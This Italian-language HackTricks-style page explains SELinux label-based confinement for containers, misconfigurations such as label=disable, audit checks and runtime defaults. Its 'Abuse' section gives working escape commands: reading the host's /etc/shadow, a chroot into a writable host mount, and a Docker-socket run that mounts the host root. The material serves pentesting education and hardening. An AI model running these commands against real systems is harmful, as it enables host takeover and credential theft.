# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Panoramica

SELinux è un sistema di **Mandatory Access Control basato sulle label**. Ogni processo e oggetto rilevante può avere un security context, e la policy decide quali domain possono interagire con quali type e in che modo. Negli ambienti containerizzati, questo significa solitamente che il runtime avvia il processo del container all'interno di un domain container confinato e assegna al contenuto del container le label corrispondenti. Se la policy funziona correttamente, il processo può essere in grado di leggere e scrivere gli elementi che la propria label dovrebbe poter toccare, mentre gli viene negato l'accesso ad altri contenuti dell'host, anche se questi diventano visibili tramite un mount.

Questa è una delle protezioni più potenti lato host disponibili nelle principali implementazioni di container Linux. È particolarmente importante su Fedora, RHEL, CentOS Stream, OpenShift e altri ecosistemi incentrati su SELinux. In questi ambienti, un reviewer che ignora SELinux spesso non comprenderà perché un percorso apparentemente ovvio verso la compromissione dell'host sia in realtà bloccato.

## AppArmor Vs SELinux

La differenza generale più semplice è che AppArmor è basato sui path, mentre SELinux è **basato sulle label**. Questo ha conseguenze rilevanti per la sicurezza dei container. Una policy basata sui path può comportarsi in modo diverso se lo stesso contenuto dell'host diventa visibile sotto un mount path imprevisto. Una policy basata sulle label, invece, verifica quale sia la label dell'oggetto e cosa il process domain possa farvi. Questo non rende SELinux semplice, ma lo rende più robusto contro una classe di supposizioni basate su trucchi dei path che i defender talvolta fanno accidentalmente nei sistemi basati su AppArmor.

Poiché il modello è orientato alle label, la gestione dei volumi dei container e le decisioni di relabeling sono critiche per la sicurezza. Se il runtime o l'operatore modifica le label in modo troppo esteso per "far funzionare i mount", il confine della policy che avrebbe dovuto contenere il workload potrebbe diventare molto più debole del previsto.

## Lab

Per verificare se SELinux è attivo sull'host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Per esaminare le label esistenti sull'host:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Per confrontare un'esecuzione normale con una in cui l'etichettatura è disabilitata:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Su un host con SELinux abilitato, questa è una dimostrazione molto pratica perché mostra la differenza tra un workload in esecuzione nel container domain previsto e uno a cui è stato rimosso quel livello di enforcement.

## Utilizzo a runtime

Podman è particolarmente ben integrato con SELinux nei sistemi in cui SELinux fa parte dei default della piattaforma. Podman rootless più SELinux costituisce una delle baseline mainstream più solide per i container, perché il processo è già non privilegiato lato host e continua a essere confinato dalla MAC policy. Anche Docker può utilizzare SELinux dove supportato, sebbene gli amministratori a volte lo disabilitino per aggirare i problemi di labeling dei volumi. CRI-O e OpenShift fanno ampio affidamento su SELinux come parte del loro modello di isolamento dei container. Anche Kubernetes può esporre impostazioni relative a SELinux, ma il loro valore dipende ovviamente dal fatto che il sistema operativo del nodo supporti ed effettivamente applichi SELinux.

La lezione ricorrente è che SELinux non è un’aggiunta opzionale. Negli ecosistemi costruiti intorno a esso, fa parte del security boundary previsto.

## Misconfigurazioni

L’errore classico è `label=disable`. Operativamente, questo accade spesso perché un volume mount è stato negato e la soluzione temporanea più rapida è stata rimuovere SELinux dall’equazione invece di correggere il modello di labeling. Un altro errore comune è il relabeling errato dei contenuti dell’host. Operazioni di relabeling estese possono far funzionare l’applicazione, ma possono anche ampliare notevolmente ciò che il container può toccare, ben oltre quanto originariamente previsto.

È inoltre importante non confondere SELinux **installato** con SELinux **effettivo**. Un host può supportare SELinux ed essere comunque in modalità permissive, oppure il runtime potrebbe non avviare il workload nel domain previsto. In questi casi la protezione è molto più debole di quanto la documentazione possa suggerire.

## Abuse

Quando SELinux è assente, in modalità permissive o ampiamente disabilitato per il workload, i path montati dall’host diventano molto più facili da abusare. Lo stesso bind mount che altrimenti sarebbe limitato dai label può diventare una via diretta verso i dati dell’host o verso la modifica dell’host. Questo è particolarmente rilevante se combinato con writable volume mount, directory del container runtime o scorciatoie operative che espongono path sensibili dell’host per comodità.

SELinux spesso spiega perché un generic breakout writeup funziona immediatamente su un host ma fallisce ripetutamente su un altro, anche se i runtime flag sembrano simili. L’elemento mancante spesso non è affatto un namespace o una capability, ma un label boundary rimasto intatto.

Il controllo pratico più rapido consiste nel confrontare l’active context e poi sondare i path dell’host montati o le directory del runtime che normalmente sarebbero confinate dai label:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Se è presente un host bind mount e l'etichettatura SELinux è stata disabilitata o indebolita, spesso la divulgazione di informazioni è il primo effetto:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Se il mount è scrivibile e il container è effettivamente root sull'host dal punto di vista del kernel, il passo successivo è testare una modifica controllata dell'host invece di procedere per tentativi:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Sugli host dotati di SELinux, la perdita delle label nelle directory dello stato di runtime può inoltre esporre percorsi diretti di privilege-escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Questi comandi non sostituiscono una catena completa di escape, ma permettono di capire molto rapidamente se SELinux era ciò che impediva l'accesso ai dati dell'host o la modifica dei file lato host.

### Esempio completo: SELinux disabilitato + mount dell'host scrivibile

Se l'etichettatura SELinux è disabilitata e il filesystem dell'host è montato con permessi di scrittura in `/host`, un full host escape diventa un normale caso di abuso di bind-mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Se `chroot` ha successo, il processo del container opera ora dal filesystem dell'host:
```bash
id
hostname
cat /etc/passwd | tail
```
### Esempio completo: SELinux disabilitato + directory di runtime

Se il workload può raggiungere un socket di runtime una volta disabilitate le label, l'escape può essere delegato al runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
L'osservazione rilevante è che SELinux era spesso il controllo che impediva esattamente questo tipo di accesso ai percorsi dell'host o allo stato del runtime.

## Verifiche

L'obiettivo delle verifiche di SELinux è confermare che SELinux sia abilitato, identificare il contesto di sicurezza corrente e verificare se i file o i percorsi che interessano siano effettivamente confinati tramite le label.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Cosa è interessante qui:

- `getenforce` dovrebbe idealmente restituire `Enforcing`; `Permissive` o `Disabled` cambiano il significato dell'intera sezione SELinux.
- Se il contesto del processo corrente appare inatteso o troppo ampio, il workload potrebbe non essere in esecuzione con la policy del container prevista.
- Se i file montati dall'host o le directory di runtime hanno label a cui il processo può accedere con troppa libertà, i bind mounts diventano molto più pericolosi.

Quando si esamina un container su una piattaforma che supporta SELinux, non bisogna considerare il labeling un dettaglio secondario. In molti casi è uno dei motivi principali per cui l'host non è già compromesso.

## Default di runtime

| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Indebolimento manuale comune |
| --- | --- | --- | --- |
| Docker Engine | Dipendente dall'host | La separazione SELinux è disponibile sugli host con SELinux abilitato, ma il comportamento esatto dipende dalla configurazione dell'host/del daemon | `--security-opt label=disable`, relabeling esteso dei bind mounts, `--privileged` |
| Podman | Generalmente abilitato sugli host con SELinux | La separazione SELinux è normalmente parte di Podman sui sistemi SELinux, salvo disabilitazione | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Generalmente non assegnato automaticamente a livello di Pod | Il supporto a SELinux esiste, ma i Pod di solito richiedono `securityContext.seLinuxOptions` o impostazioni predefinite specifiche della piattaforma; sono necessari il supporto del runtime e del nodo | `seLinuxOptions` deboli o troppo ampie, esecuzione su nodi in modalità permissive/disabilitata, policy della piattaforma che disabilitano il labeling |
| CRI-O / deployment in stile OpenShift | Generalmente utilizzato ampiamente | SELinux è spesso una parte fondamentale del modello di isolamento del nodo in questi ambienti | policy personalizzate che ampliano eccessivamente l'accesso, disabilitazione del labeling per motivi di compatibilità |

I default di SELinux dipendono maggiormente dalla distribuzione rispetto ai default di seccomp. Sui sistemi in stile Fedora/RHEL/OpenShift, SELinux è spesso centrale nel modello di isolamento. Sui sistemi senza SELinux, è semplicemente assente.
{{#include ../../../../banners/hacktricks-training.md}}
